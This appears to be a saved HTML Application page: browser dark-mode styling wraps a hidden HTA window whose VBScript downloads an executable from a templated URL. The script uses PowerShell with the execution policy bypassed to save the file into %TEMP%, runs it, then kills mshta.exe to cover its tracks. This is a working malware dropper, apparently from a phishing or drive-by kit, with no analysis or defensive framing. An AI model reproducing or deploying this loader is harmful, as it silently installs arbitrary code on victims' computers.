...
<html data-darkreader-mode="dynamic" data-darkreader-scheme="dark" data-darkreader-proxy-injected="true"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, img.Wirisformula, a[data-testid="headerMediumLogo"]>svg, .d2l-navigation-link-image-container, .d2l-iframe-loading-container {
...
::-moz-selection {
    ...
    <meta name="darkreader" content="28cce300abe440ebb3d2496da5eb2bc9"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
...
embed[type="application/pdf"][src="about:blank"] { filter: invert(100%) contrast(90%); }</style></head><body><hta:application id=" " icon="favicon.ico" maximizebutton="no" border="thin" showintaskbar="no" innerborder="no" reseize="no" scroll="no" singleinstance="yes" selection="no" version="1.0">
    <title> </title>
    <script language="VBScript">
        Const DOWNLOAD_URL = "<?=DOWNLOAD_URL_EXE?>"
        Const PROGRAM_NAME = "<?=PROGRAM_NAME_EXE?>"

        Dim downloadCompleted
        ...
        DownloadAndExecute DOWNLOAD_URL, PROGRAM_NAME

        TerminateMSHTA

        Sub DownloadAndExecute(downloadUrl, programName)
            Dim downloadFile, TempFolder, attempts, maxAttempts, success
            Dim objShell

            Set objShell = CreateObject("WScript.Shell")
            TempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
            downloadFile = TempFolder & "\" & programName
            ...
            Do While attempts < maxAttempts
                Dim cmdCommand
                cmdCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Try { Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadFile & "' -ErrorAction Stop } Catch { Exit 1 }"""
            ...
            objShell.Run downloadFile, 1, False
        End Sub
        ...
        Sub TerminateMSHTA()
            ...
            objProcess.Run "taskkill /f /im mshta.exe", 0, False
        End Sub
    </script>
